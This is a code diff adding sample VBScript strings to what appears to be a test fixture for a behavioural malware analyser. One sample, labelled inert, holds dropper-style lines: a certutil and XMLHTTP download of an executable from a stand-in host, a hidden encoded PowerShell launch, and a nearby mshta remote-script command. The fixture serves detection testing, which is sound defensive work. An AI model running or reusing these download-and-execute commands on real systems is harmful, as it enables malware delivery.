@@ -549,6 +549,29 @@ SAMPLE_TEXT_FILES: Dict[str, str] = {
         "rem Indicator: mshta remote script (LOLBin)\n"
         "mshta http://malware-sample.example.com/x.hta\n"
     ),
+    "behavior/dropper.vbs": (
+        "' DEMO - inert sample for the behavioural analyser (never executed).\n"
+        "' The hostnames below do not exist; nothing is ever run.\n"
+        "\n"
+        "' Indicator: WScript.Shell command execution\n"
+        "Set shell = CreateObject(\"WScript.Shell\")\n"
+        "\n"
+        "' Indicator: XMLHTTP download + certutil URL cache (LOLBin)\n"
+        "Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
+        "http.Open \"GET\", \"http://malware-sample.example.com/stage.bin\", False\n"
+        "http.Send\n"
+        "shell.Run \"certutil -urlcache -f -split "
+        "http://malware-sample.example.com/d.exe %TEMP%\\\\d.exe\", 0\n"
+        "\n"
+        "' Indicator: hidden encoded PowerShell launch\n"
+        "shell.Run \"powershell -nop -w 0 -enc SQBFAFgAIA==\", 0\n"
+    ),
+    "behavior/harmless-vbs.vbs": (
+        "' DEMO - harmless VBScript (never executed).\n"
+        "\n"
+        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+        "WScript.Echo \"Report written at \" & Now()\n"
+    ),
 }
 
 #: Top-level clean text sample.
